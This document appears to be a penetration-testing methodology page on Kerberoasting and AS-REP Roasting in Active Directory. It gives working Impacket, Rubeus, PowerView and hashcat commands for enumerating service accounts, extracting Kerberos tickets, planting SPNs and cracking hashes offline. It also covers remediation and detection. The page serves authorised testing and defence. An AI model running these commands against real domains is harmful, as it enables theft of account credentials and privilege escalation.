# Kerberoasting and AS-REP Roasting

## Overview
Kerberoasting and AS-REP Roasting are Active Directory attack techniques that extract Kerberos-encrypted tickets for offline password cracking. Kerberoasting targets service accounts by requesting TGS (Ticket Granting Service) tickets encrypted with the service account's password hash. AS-REP Roasting targets accounts that do not require Kerberos pre-authentication, allowing the attacker to request and crack the encrypted AS-REP response. Both attacks require only a valid domain user account (or no account for AS-REP Roasting in some cases) and produce crackable hashes offline with no further network interaction.

## Classification
- **CWE:** CWE-916 (Use of Password Hash With Insufficient Computational Effort), CWE-521 (Weak Password Requirements), CWE-308 (Use of Single-factor Authentication)
- **OWASP:** A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 6.5 - 8.8 (Medium to High)
- **MITRE ATT&CK:** T1558.003 (Kerberoasting), T1558.004 (AS-REP Roasting)

## Detection Methodology

### 1. SPN Enumeration (Kerberoasting Prerequisite)
Identify service accounts with Service Principal Names (SPNs):
```powershell
# PowerShell - Query AD for user accounts with SPNs
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet, LastLogonDate, Enabled |
  Select-Object SamAccountName, ServicePrincipalName, PasswordLastSet, LastLogonDate, Enabled

# LDAP filter for SPN enumeration
(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))
```

```bash
# Linux - ldapsearch
ldapsearch -x -H ldap://dc.target.com -D "user@target.com" -w 'password' \
  -b "dc=target,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Impacket - GetUserSPNs.py (enumerate only)
GetUserSPNs.py target.com/user:password -dc-ip 10.10.10.1
```

**High-value targets:**
- Service accounts with admin group membership
- Service accounts with delegation rights
- Accounts with old passwords (PasswordLastSet years ago)
- Accounts running critical services (SQL, Exchange, IIS)

### 2. Kerberoasting - TGS Extraction

**Impacket - GetUserSPNs.py:**
```bash
# Request TGS tickets for all SPNs (with hash output)
GetUserSPNs.py target.com/user:password -dc-ip 10.10.10.1 -request

# Request TGS for specific SPN
GetUserSPNs.py target.com/user:password -dc-ip 10.10.10.1 \
  -request-user svc_sql

# Output in hashcat format
GetUserSPNs.py target.com/user:password -dc-ip 10.10.10.1 \
  -request -outputfile kerberoast_hashes.txt

# Using NTLM hash instead of password
GetUserSPNs.py target.com/user -hashes :ntlm_hash -dc-ip 10.10.10.1 -request
```

**Rubeus (Windows):**
```powershell
# Kerberoast all SPNs
Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast specific user
Rubeus.exe kerberoast /user:svc_sql /outfile:hashes.txt

# Kerberoast with RC4 (easier to crack, but more detectable)
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt

# Kerberoast with AES (stealthier, harder to crack)
Rubeus.exe kerberoast /aes /outfile:hashes.txt

# Target only accounts with admin privileges
Rubeus.exe kerberoast /ldapfilter:"admincount=1" /outfile:hashes.txt

# Use alternate credentials
Rubeus.exe kerberoast /creduser:target.com\user /credpassword:password /outfile:hashes.txt

# Stats without requesting tickets
Rubeus.exe kerberoast /stats
```

**PowerView:**
```powershell
# Request TGS tickets
Invoke-Kerberoast -OutputFormat hashcat | Select-Object Hash | Out-File hashes.txt

# Target specific user
Invoke-Kerberoast -Identity svc_sql -OutputFormat hashcat
```

### 3. AS-REP Roasting
Target accounts with "Do not require Kerberos preauthentication" enabled:

**Enumerate vulnerable accounts:**
```powershell
# PowerShell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# LDAP filter
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
```

**Impacket - GetNPUsers.py:**
```bash
# Check for AS-REP roastable accounts (with known users)
GetNPUsers.py target.com/user:password -dc-ip 10.10.10.1

# Request AS-REP hashes
GetNPUsers.py target.com/user:password -dc-ip 10.10.10.1 -request

# No authentication required (with user list)
GetNPUsers.py target.com/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass

# Output in hashcat format
GetNPUsers.py target.com/ -dc-ip 10.10.10.1 -usersfile users.txt \
  -no-pass -format hashcat -outputfile asrep_hashes.txt
```

**Rubeus (Windows):**
```powershell
# AS-REP roast all vulnerable accounts
Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Target specific user
Rubeus.exe asreproast /user:target_user /outfile:asrep_hashes.txt

# AS-REP roast with specific format
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

### 4. Targeted Kerberoasting
Set an SPN on a target account to make it Kerberoastable (requires write permissions):
```powershell
# Set SPN on target user (requires GenericAll/GenericWrite on the user)
Set-ADUser -Identity target_admin -ServicePrincipalNames @{Add="MSSQLSvc/fake.target.com:1433"}

# Kerberoast the targeted account
Rubeus.exe kerberoast /user:target_admin /outfile:targeted_hash.txt

# Clean up - remove the SPN
Set-ADUser -Identity target_admin -ServicePrincipalNames @{Remove="MSSQLSvc/fake.target.com:1433"}
```

```bash
# Linux - targeted Kerberoasting with Impacket
# Add SPN
addspn.py -u target.com/attacker -p password -s MSSQLSvc/fake.target.com target.com/target_admin

# Request TGS
GetUserSPNs.py target.com/attacker:password -dc-ip 10.10.10.1 -request-user target_admin

# Remove SPN
addspn.py -u target.com/attacker -p password -r MSSQLSvc/fake.target.com target.com/target_admin
```

## Offline Cracking

### Hashcat
```bash
# Kerberos 5 TGS-REP etype 23 (RC4)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# Kerberos 5 TGS-REP etype 17 (AES128)
hashcat -m 19600 kerberoast_hashes.txt wordlist.txt

# Kerberos 5 TGS-REP etype 18 (AES256)
hashcat -m 19700 kerberoast_hashes.txt wordlist.txt

# Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack for common patterns
hashcat -m 13100 kerberoast_hashes.txt -a 3 '?u?l?l?l?l?l?d?d?d!'
```

### John the Ripper
```bash
# Kerberoast
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# AS-REP Roast
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# With rules
john --format=krb5tgs kerberoast_hashes.txt --wordlist=wordlist.txt --rules=All
```

## Remediation
1. **Use strong passwords for service accounts** -- 25+ character random passwords or Group Managed Service Accounts (gMSA)
2. **Deploy Group Managed Service Accounts (gMSA)** -- automatic 120-character password rotation
3. **Disable RC4 for Kerberos** -- force AES encryption (significantly harder to crack)
4. **Require Kerberos pre-authentication** -- ensure "Do not require Kerberos preauthentication" is NOT set
5. **Rotate service account passwords regularly** -- at least every 90 days
6. **Monitor for anomalous TGS requests** -- detect mass TGS-REQ events (Event ID 4769)
7. **Use honeypot SPNs** -- create monitored decoy service accounts to detect Kerberoasting
8. **Apply least privilege** -- service accounts should not be Domain Admins
9. **Audit SPN assignments** -- regularly review which accounts have SPNs
10. **Enable Advanced Audit Policy** -- log Kerberos Service Ticket Operations

## Detection (Blue Team Indicators)
```
Windows Event Logs:
- Event ID 4769: Kerberos Service Ticket was requested
  - Filter: Ticket Encryption Type = 0x17 (RC4) from user accounts
  - Anomaly: single user requesting TGS for many SPNs in short time
- Event ID 4768: Kerberos Authentication Ticket (TGT) was requested
  - Filter: Pre-Authentication Type = 0 (AS-REP Roasting indicator)

Sigma rules:
- Kerberoasting: mass TGS-REQ with RC4 encryption from single source
- AS-REP Roasting: AS-REQ without pre-authentication for user accounts
```

## Evidence Collection
When documenting Kerberoasting/AS-REP Roasting findings:
- List of accounts with SPNs and their privilege levels
- List of accounts without pre-authentication requirement
- Number of TGS/AS-REP tickets extracted
- Cracking results: accounts compromised and time to crack
- Password complexity of cracked service accounts
- Service account privilege levels (admin, delegation rights)
- Encryption types in use (RC4 vs AES)
- gMSA adoption level across the environment
- Detection capability assessment (were the attacks logged and alerted?)
- Remediation priority based on account privilege and password strength
